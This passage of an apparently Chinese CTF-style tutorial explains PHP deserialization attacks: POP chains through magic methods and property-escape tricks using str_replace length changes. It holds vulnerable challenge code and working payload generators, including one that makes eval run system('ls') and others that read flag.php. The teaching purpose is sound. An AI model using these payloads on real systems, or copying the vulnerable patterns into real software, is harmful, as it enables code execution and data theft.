class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目会发现<code>normal</code>一点用没有，最终我们需要去触发<code>evil-&gt;action</code>方法，想要调用到这里需要<code>index</code>类的<code>__destruct</code>魔术方法，当前代码反序列化index的话会直接调用它，我们需要在意<code>index-&gt;test</code>的值，他如果是evil那就刚好可以触发，那我们最终的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">// O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p>用上面payload会直接去执行<code>system(&#39;ls&#39;);</code>。</p><h2 id="前置例题2"><a href="#前置例题2" class="headerlink" title="前置例题2"></a>前置例题2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup is here!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring is here!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目需要我们简单的构造一个链的触发形式，通过fast的wakeup-》sec–》tostring，解题脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fast</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title function_ invoke__">sec</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"> <span class="comment">// O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D</span></span><br></pre></td></tr></table></figure><h2 id="什么是pop链？"><a href="#什么是pop链？" class="headerlink" title="什么是pop链？"></a>什么是pop链？</h2><p>在反序列化中，我们能控制的数据就是对象中的属性值(成员变量)，所以在PHP反序列化中有一种漏洞利用方法叫<code>面向属性编程</code>，即<code>POP(Property Oriented Programming)</code>。POP链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload。</p><h2 id="pop链例题"><a href="#pop链例题" class="headerlink" title="pop链例题"></a>pop链例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个题目提供了多个类<code>Modifier</code>、<code>Show</code>、<code>Test</code>，我们最终的目的肯定是拿flag，在他这里flag输出是在<code>Modifier</code>类的append函数中，并且他在里头进行了一次文件包含，在文件的开头也提示了flag存储在<code>flag.php</code>中，然后我们想要触发这个函数需要被自身的<code>__invoke</code>调用，而<code>__invoke</code>需要当前类被当作函数调用，我们再看其他类中是否又调用<code>Modifier-&gt;var</code>的这种方法。目前得知的信息是需要触发<code>Modifier-&gt;__invoke</code>函数，然后var需要等于<code>flag.php</code>。当前构造的代码应该如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br></pre></td></tr></table></figure><p>我们再继续看应该怎么触发<code>__invoke</code>函数，他需要一个类被当作函数调用才会触发，我们想办法找一下触发他的方法，在<code>Test</code>类的<code>__get</code>函数中发现了一个返回执行函数的内容<code>return $function();</code>他是通过<code>this-&gt;p</code>获取的方法，那我们这里可以把<code>p</code>修改成<code>Modifier</code>类。当前构造的代码应当如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时我们需要想办法触发<code>Test-&gt;__get</code>函数，他的触发条件是被访问不存在的成员属性的时候触发，其实这里已经很明显了，<code>Modifier</code>和<code>Test</code>都利用完了，剩下的就是<code>Show</code>了，他在<code>Show-&gt;__toString</code>的时候调用了<code>$this-&gt;str-&gt;source</code>这个str我们完全可以自己控制，那怎么触发<code>__toString</code>呢？在<code>Show-&gt;__wakeup</code>中输出了一下source这个变量，那么我们可以就可以把具体构造好的丢给<code>source</code>然后就依次触发了<code>echo $flag</code>的命令。具体payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;p = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;source = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><h2 id="关于逃逸"><a href="#关于逃逸" class="headerlink" title="关于逃逸"></a>关于逃逸</h2><p>反序列化的时候会以<code>;&#125;</code>j结束，后面的字符串不影响正常的反序列化。关于逃逸的题目一般都不可以直接控制整个反序列化的数据，能够控制的可能只是被反序列化的成员变量，数据先经过依次<code>serialize</code>再经过<code>unserialize</code>，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸。</p><h2 id="增加例题"><a href="#增加例题" class="headerlink" title="增加例题"></a>增加例题</h2><p>增加例题如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$profile</span>-&gt;pass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单分析一下，这道题目可以传入<code>param</code>但是用户无法直接控制序列化时的反序列化字符串，因为是他在代码中生成的，传入的<code>param</code>会被丢进<code>test</code>的<code>test-&gt;user</code>变量中，但是他这里存在一个替换的问题，在<code>filter</code>里，他会把<code>php</code>全都替换成hack，我们需要想办法控制<code>test-&gt;pass</code>等于<code>escaping</code>，这里其实存在一个增加逃逸的漏洞，主要体现在<code>filter</code>函数中，它可以把咱们输入的数据替换掉，如果是php的话那就会增长的替换，我们可以把需要反序列化的内容的后半部分丢进去，然后采用<code>php</code>去把<code>user</code>当时定义好的长度填满，这样就造成了咱们的反序列化逃逸，我们需要逃逸的主要内容是<code>test-&gt;pass</code>，具体的序列化内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span>escaping<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>前面的<code>&quot;;</code>是为了闭合上一个字符串数据，后面的<code>;&#125;</code>也是为了闭合当前反序列化数据的整体，他的长度是29，那么我们就需要溢出29个字符串，相当于需要溢出29个<code>php</code>那payload就如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span>escaping<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>使用当前payload的话。在进行<code>filter($param)</code>之后的字符串如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">116</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;escaping&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:8:&quot;</span>daydream<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>user完美的把所有hack都吃掉了，然后就是咱们的数据。输出的flag在源代码中<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250620144620.png"></p><h2 id="减少例题"><a href="#减少例题" class="headerlink" title="减少例题"></a>减少例题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hk&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>, <span class="variable">$pass</span>));</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;vip) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>减少的这道例题我们最终要构建的是让<code>test-&gt;vip</code>变成<code>true</code>就会输出flag，但是true我们没办法直接控制，我们可以控制的字段只有test的<code>user</code>和<code>pass</code>，然后它里面话还有一个<code>filter</code>他会在序列化之后反序列化之前执行，他会更改咱们的序列化数据，这里就存在了逃逸漏洞，他会把<code>php</code>和<code>flag</code>都给替换成<code>hk</code>，我们可以先通过下面代码构造出咱们需要的反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&quot;userdata&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span> = <span class="string">&quot;passdata&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$vip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 输出 O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:8:&quot;userdata&quot;;s:4:&quot;pass&quot;;s:8:&quot;passdata&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到的是user在最前头，我们可以把user的长度搞的很大，让其<code>filter</code>缩小之后可以逃逸到pass和vip部分，那么我们需要逃逸数据如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:4:&quot;</span>pass<span 